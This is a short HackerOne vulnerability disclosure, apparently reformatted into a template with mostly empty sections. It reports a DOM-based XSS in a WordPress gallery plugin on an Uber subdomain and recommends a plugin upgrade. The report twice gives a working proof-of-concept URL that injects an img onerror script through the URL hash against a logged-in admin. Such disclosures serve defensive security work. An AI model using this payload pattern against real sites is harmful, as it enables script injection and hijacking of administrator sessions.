# DOM based XSS on

## Metadata
- **Source:** HackerOne
- **Report:** 139875 | https://hackerone.com/reports/139875
- **Submitted:** 2016-05-19
- **Reporter:** blackzero
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Code Injection
- **CVEs:** None
- **Category:** web-api

## Summary
Possible Remote code execution DOM based XSS 

Vuln Jquery param :
var strliID=jQuery(location).attr('hash');

Target: Logged admin
Go url >> https://drive.uber.com/melbourne/wp-admin/admin.php?page=Options_gallery_styles#"><img src=M onerror=alert('0wn3d');>

Solution : Upgrade latest version gallery plugin (Your version v1.9.55)


Test my localhost picture attached:

Regards..

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Possible Remote code execution DOM based XSS 

Vuln Jquery param :
var strliID=jQuery(location).attr('hash');

Target: Logged admin
Go url >> https://drive.uber.com/melbourne/wp-admin/admin.php?page=Options_gallery_styles#"><img src=M onerror=alert('0wn3d');>

Solution : Upgrade latest version gallery plugin (Your version v1.9.55)


Test my localhost picture attached:

Regards..

</details>

---
*Analysed by Claude on 2026-05-24*
